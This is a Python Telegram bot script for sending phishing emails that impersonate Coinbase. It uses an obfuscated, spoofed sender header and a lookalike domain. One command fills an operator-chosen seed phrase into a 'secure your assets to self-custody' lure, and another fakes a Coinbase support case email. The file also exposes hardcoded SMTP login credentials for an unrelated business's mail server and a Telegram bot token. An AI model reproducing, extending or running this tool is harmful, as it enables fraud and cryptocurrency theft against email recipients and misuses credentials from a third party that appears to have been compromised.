import smtplib
import os
import logging
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes

# Email configuration
from_display_name = "=?UTF-8?B?4oCNQ2/igI3igI3igIzigI3igI1p4oCN4oCN4oCM4oCN4oCNbmJh4oCN4oCN4oCM4oCN4oCNc2UgPG5vLXJlcGx5QGNvaW5iYXNlLmNvbT4==="
from_email = "=?UTF-8?B?[base64domainhere]<=?UTF-8?B?[base64domainhere]@tk8wqcbrcxhekrwy1n80.coinbase.co>"
smtp_details = {
    'server': 'sagacoffee.com.au',  # Your SMTP server
    'port': 587,  # Your SMTP port
    'username': 'administrator@sagacoffee.com.au',  # Your SMTP username
    'password': 'rz?.r^*L8X03x'  # Your SMTP password
}

# Telegram bot conversation states
RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE = range(4)

# Logging setup
logging.basicConfig(level=logging.INFO)

# /wallet_coinbase command handler
async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS

# Get recipient's email address for wallet_coinbase
async def get_wallet_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the seed phrase:")
    return SEED_PHRASE

# Send wallet coinbase email with image attachment directly
async def send_wallet_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    seed_phrase = update.message.text

    # Load the HTML template for the wallet email
    with open("coinbase_wallet_template.html", "r", encoding="utf-8") as file:
        html_content = file.read()

    # Replace the seed phrase placeholder
    html_content = html_content.replace("seed_placeholder", seed_phrase)

    # Create email with HTML content
    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "ACTION NEEDED: Secure your assets to self-custody"
    msg.attach(MIMEText(html_content, 'html'))

    # Attach the image directly
    image_path = "wallet.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)

    # Send the email via SMTP
    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")
    
    return ConversationHandler.END

# /employee_coinbase command handler
async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS

# Get recipient's email address for employee_coinbase
async def get_employee_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the representative's name:")
    return REPRESENTATIVE

# Get representative's name for employee_coinbase
async def get_representative_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["representative"] = update.message.text
    await update.message.reply_text("Enter the case ID:")
    return CASE_ID

# Send employee coinbase email with image attachment directly
async def send_employee_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    representative = context.user_data["representative"]
    case_id = update.message.text

    # Load the HTML template for the employee email
    with open("coinbase_template.html", "r", encoding="utf-8") as file:
        html_content = file.read()

    # Replace placeholders for representative and case ID
    html_content = html_content.replace("Daniel Greene", representative)
    html_content = html_content.replace("1835246", case_id)

    # Create email with HTML content
    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "Coinbase Case Review"
    msg.attach(MIMEText(html_content, 'html'))

    # Attach the image directly
    image_path = "coinbase.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)

    # Send the email via SMTP
    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")
    
    return ConversationHandler.END

def main():
    TOKEN = "7454367733:AAFppCorOhHmnRIjXZ5VU8jPZd2WPm3IOWo"  # Replace with your bot token
    application = ApplicationBuilder().token(TOKEN).build()

    # Conversation handler for /wallet_coinbase
    wallet_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("wallet_coinbase", wallet_coinbase)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet_recipient_email)],
            SEED_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_wallet_email)],
        },
        fallbacks=[],
    )

    # Conversation handler for /employee_coinbase
    employee_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_coinbase", employee_coinbase)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_employee_recipient_email)],
            REPRESENTATIVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative_name)],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_employee_email)],
        },
        fallbacks=[],
    )

    # Add handlers to the application
    application.add_handler(wallet_coinbase_handler)
    application.add_handler(employee_coinbase_handler)

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
